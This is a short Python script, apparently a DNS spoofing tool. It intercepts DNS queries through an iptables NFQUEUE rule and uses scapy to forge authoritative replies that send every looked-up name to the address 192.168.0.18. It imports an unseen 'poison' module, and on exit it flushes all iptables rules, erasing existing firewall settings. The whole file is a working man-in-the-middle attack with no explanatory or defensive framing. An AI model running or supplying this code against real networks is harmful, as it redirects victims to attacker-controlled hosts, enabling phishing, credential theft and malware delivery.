from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import poison

def parse(packet):
    pkt = IP(packet.get_payload())
    if not pkt.haslayer(DNSQR):
        packet.accept()
    else:
        spkt =  (IP(dst=pkt[IP].src, src=pkt[IP].dst) /
                UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /
                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="192.168.0.18")))
        packet.set_payload(str(spkt))
        packet.accept()

def main():
    os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, parse)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        nfqueue.unbind()
        os.system('iptables -F')
        os.system('iptables -t nat -F')

if __name__ == '__main__':
    main()
